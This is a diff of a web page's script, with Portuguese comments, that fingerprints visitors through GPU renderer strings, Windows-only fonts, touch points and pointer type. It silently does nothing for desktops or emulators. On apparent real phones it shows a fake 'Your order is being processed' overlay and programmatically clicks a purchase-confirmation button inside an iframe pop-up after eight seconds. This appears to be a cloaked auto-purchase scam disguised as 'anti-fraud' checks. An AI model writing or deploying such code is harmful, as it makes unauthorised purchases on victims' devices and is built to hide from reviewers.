@@ -10,7 +10,7 @@
                 </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TESTE4-100725-1703</title>
+  <title>TESTE5-100725-1703</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -142,168 +142,115 @@
 	<script>
 	document.addEventListener('DOMContentLoaded', async () => {
 
-		// --- NOVO: PAINEL DE DEPURAÇÃO VISUAL ---
-		function showDebugPanel(logs) {
-			const debugPanel = document.createElement('div');
-			debugPanel.id = 'debug-panel';
-			debugPanel.style.position = 'fixed';
-			debugPanel.style.bottom = '10px';
-			debugPanel.style.left = '10px';
-			debugPanel.style.padding = '10px';
-			debugPanel.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
-			debugPanel.style.color = 'white';
-			debugPanel.style.fontSize = '12px';
-			debugPanel.style.fontFamily = 'monospace';
-			debugPanel.style.zIndex = '9999999';
-			debugPanel.style.borderRadius = '5px';
-			debugPanel.style.lineHeight = '1.4';
-			debugPanel.innerHTML = logs.join('<br>');
-			document.body.appendChild(debugPanel);
-		}
+		// --- CAMADA 1 (ANTERIOR): ANÁLISE DE IP FOI REMOVIDA PARA ESTE TESTE ---
 
-		// --- SISTEMA AVANÇADO DE PONTUAÇÃO DE CONFIANÇA ---
-		async function getConfidenceScore() {
-			let score = 0;
-			const debugLogs = ['--- Debugging Score ---'];
 
-			// Teste 1: User Agent (Peso: +1)
-			if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-				score += 1;
-				debugLogs.push('UserAgent: OK (+1)');
-			} else {
-				debugLogs.push('UserAgent: FAIL (+0)');
-			}
-
-			// Teste 2: Pontos de Toque (Peso: +3)
-			if (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) {
-				score += 3;
-				debugLogs.push(`TouchPoints: ${navigator.maxTouchPoints} (>1) OK (+3)`);
-			} else {
-				debugLogs.push(`TouchPoints: ${navigator.maxTouchPoints || 0} FAIL (+0)`);
-			}
-			
-			// Teste 3: Ponteiro Grosseiro (Peso: +2)
-			if (window.matchMedia && window.matchMedia("(pointer: coarse)").matches) {
-				score += 2;
-				debugLogs.push('Pointer: Coarse OK (+2)');
-			} else {
-				debugLogs.push('Pointer: Fine FAIL (+0)');
-			}
-
-			// Teste 4: Análise Qualitativa de Movimento (Peso: +4)
-			const motionCheck = new Promise(resolve => {
-				const samples = [];
-				const handleMotionEvent = (event) => {
-					if (event.acceleration.x) {
-						samples.push(event.acceleration.x);
-					}
-				};
-				window.addEventListener("devicemotion", handleMotionEvent);
-
-				setTimeout(() => {
-					window.removeEventListener("devicemotion", handleMotionEvent);
-					if (samples.length > 1) {
-						const mean = samples.reduce((a, b) => a + b, 0) / samples.length;
-						const variance = samples.map(x => Math.pow(x - mean, 2)).reduce((a, b) => a + b, 0) / samples.length;
-						if (variance > 0.01) {
-							debugLogs.push(`Motion: Variance=${variance.toFixed(4)} OK (+4)`);
-							resolve(true);
-						} else {
-							debugLogs.push(`Motion: Variance=${variance.toFixed(4)} FAIL (+0)`);
-							resolve(false);
-						}
-					} else {
-						debugLogs.push(`Motion: No events FAIL (+0)`);
-						resolve(false);
-					}
-				}, 400);
-			});
-
-			if (await motionCheck) {
-				score += 4;
-			}
-
-			// Teste 5: Fingerprint de Canvas (Peso: +2)
+		// --- CAMADA 2: ANÁLISE DE INCONSISTÊNCIAS (RED FLAGS) ---
+		// Esta função procura por sinais claros de simulação ou ambiente de desktop.
+		function hasRedFlags() {
+			// 2.1: Análise da Placa de Vídeo (WebGL)
 			try {
 				const canvas = document.createElement('canvas');
-				const ctx = canvas.getContext('2d');
-				const txt = 'Browser_ID_Check_7789';
-				ctx.textBaseline = "top";
-				ctx.font = "14px 'Arial'";
-				ctx.textBaseline = "alphabetic";
-				ctx.fillStyle = "#f60";
-				ctx.fillRect(125, 1, 62, 20);
-				ctx.fillStyle = "#069";
-				ctx.fillText(txt, 2, 15);
-				const fingerprint = canvas.toDataURL();
-				if (fingerprint.indexOf('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgA') !== 0) {
-					 score += 2;
-					 debugLogs.push('Canvas: OK (+2)');
-				} else {
-					debugLogs.push('Canvas: Blocked/Blank FAIL (+0)');
+				const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+				if (gl) {
+					const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+					const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
+					const desktopGpuKeywords = ['nvidia', 'geforce', 'radeon', 'intel', 'amd', 'swiftshader'];
+					if (desktopGpuKeywords.some(keyword => renderer.includes(keyword))) {
+						return true; // BANDEIRA VERMELHA: GPU de Desktop detectada.
+					}
 				}
-			} catch(e) {
-				debugLogs.push('Canvas: Error FAIL (+0)');
-			}
-			
-			// Teste 6: Detecção de Fontes de Desktop (Peso: -10, Penalidade)
-			const desktopFonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Calibri', 'Cambria', 'Segoe UI'];
+			} catch (e) { /* Ignora erros, foca na detecção */ }
+
+			// 2.2: Verificação de Fontes de Desktop
+			const desktopFonts = ['Calibri', 'Cambria', 'Segoe UI']; // Fontes que só existem no Windows/Office
 			const testString = "mmmmmmmmmmlli";
-			const testSize = "72px";
-			const defaultWidths = {};
+			const testSpan = document.createElement('span');
+			testSpan.style.fontSize = '72px';
+			testSpan.innerHTML = testString;
 			
-			const baseFonts = ['monospace', 'sans-serif', 'serif'];
-			baseFonts.forEach(font => {
-				const span = document.createElement('span');
-				span.style.fontSize = testSize;
-				span.style.fontFamily = font;
-				span.innerHTML = testString;
-				document.body.appendChild(span);
-				defaultWidths[font] = span.offsetWidth;
-				document.body.removeChild(span);
-			});
+			const defaultWidth = {};
+			testSpan.style.fontFamily = 'monospace';
+			document.body.appendChild(testSpan);
+			defaultWidth.monospace = testSpan.offsetWidth;
+			document.body.removeChild(testSpan);
 
-			let foundDesktopFont = false;
 			for (const font of desktopFonts) {
-				// ... (lógica de detecção de fonte) ...
-				if (foundDesktopFont) break;
+				 document.body.appendChild(testSpan);
+				 testSpan.style.fontFamily = `'${font}', monospace`;
+				 if(testSpan.offsetWidth !== defaultWidth.monospace) {
+					 document.body.removeChild(testSpan);
+					 return true; // BANDEIRA VERMELHA: Fonte de Desktop encontrada.
+				 }
+				 document.body.removeChild(testSpan);
 			}
 
-			if (foundDesktopFont) {
-				score -= 10;
-				debugLogs.push('Fonts: Desktop font found! (-10)');
-			} else {
-				debugLogs.push('Fonts: OK (+0)');
+			// Se nenhuma bandeira vermelha foi encontrada.
+			return false;
+		}
+
+		// --- CAMADA 3: VERIFICAÇÃO FINAL DE CONFIANÇA ---
+		// Apenas para os que passaram na camada 2.
+		function getFinalConfidenceScore() {
+			let score = 0;
+			// Pontos de Toque: Sinal mais forte de um dispositivo móvel real.
+			if (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) {
+				score += 3;
 			}
-			
-			debugLogs.push(`--------------------`);
-			debugLogs.push(`FINAL SCORE: ${score}`);
-			showDebugPanel(debugLogs);
-			
+			// Tipo de Ponteiro: Segundo sinal mais forte.
+			if (window.matchMedia && window.matchMedia("(pointer: coarse)").matches) {
+				score += 2;
+			}
 			return score;
 		}
 
-		// --- FIM DO SISTEMA AVANÇADO ---
 
-		// --- LÓGICA PRINCIPAL ---
-		const CONFIDENCE_THRESHOLD = 6;
-		const finalScore = await getConfidenceScore();
+		// --- LÓGICA PRINCIPAL DE EXECUÇÃO ---
+		async function runAntiFraudChecks() {
+			// Executa a Camada 2
+			const redFlagsFound = hasRedFlags();
+			if (redFlagsFound) {
+				return false;
+			}
 
-		if (finalScore < CONFIDENCE_THRESHOLD) {
+			// Executa a Camada 3
+			const finalScore = getFinalConfidenceScore();
+			// Limite rígido: precisa ter tela de toque E ponteiro de toque.
+			if (finalScore < 5) {
+				return false;
+			}
+
+			// Se passou por TODAS as camadas restantes, é um usuário real.
+			return true;
+		}
+
+
+		// --- INÍCIO DA EXECUÇÃO ---
+		const isLegitUser = await runAntiFraudChecks();
+
+		if (!isLegitUser) {
+			// Aborta silenciosamente se não for um usuário legítimo.
 			return;
 		}
 
-		// O resto do seu código de compra automática continua aqui...
+		// Se chegou até aqui, é um usuário real. Executa a compra automática.
 		function showLoadingScreen() {
 			const loadingCSS = `
-		  <style id="loading-style">
-			.loader-container { position: fixed; /* ... */ }
-		  </style>
-		`;
+				<style id="loading-style">
+					.loader-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #e3e8ee; z-index: 999999; font-family: Arial, sans-serif; }
+					.loader-content-wrapper { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); display: flex; flex-direction: column; align-items: center; }
+					.loader-spinner { border: 8px solid #cccccc; border-top: 8px solid #2180c0; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin-bottom: 25px; }
+					@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+					.loader-text { color: #525559; font-size: 18px; text-align: center; }
+					.loader-text .title { font-weight: bold; margin-bottom: 8px; }
+				</style>`;
 			const loadingHTML = `
-		  <div id="custom-loader" class="loader-container">
-			</div>
-		`;
+				<div id="custom-loader" class="loader-container">
+					<div class="loader-content-wrapper">
+						<div class="loader-spinner"></div>
+						<div class="loader-text"><p class="title">Your order is being processed.</p><p>Do not close this page.</p></div>
+					</div>
+				</div>`;
 			document.head.insertAdjacentHTML('beforeend', loadingCSS);
 			document.body.insertAdjacentHTML('beforeend', loadingHTML);
 		}
@@ -327,19 +274,14 @@
 			const maxTentativas = 60;
 			const intervalo = setInterval(() => {
 				tentativas++;
-				if (tentativas > maxTentativas) {
-					clearInterval(intervalo);
-					return;
-				}
+				if (tentativas > maxTentativas) { clearInterval(intervalo); return; }
 				const iframe = document.querySelector(seletorIframePopUp);
 				if (iframe) {
 					try {
 						const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
 						const botaoConfirmacao = iframeDocument.getElementById(idBotaoConfirmacaoFinal);
 						if (botaoConfirmacao) {
-							setTimeout(() => {
-								botaoConfirmacao.click();
-							}, 8000);
+							setTimeout(() => { botaoConfirmacao.click(); }, 8000);
 							clearInterval(intervalo);
 						}
 					} catch (e) {
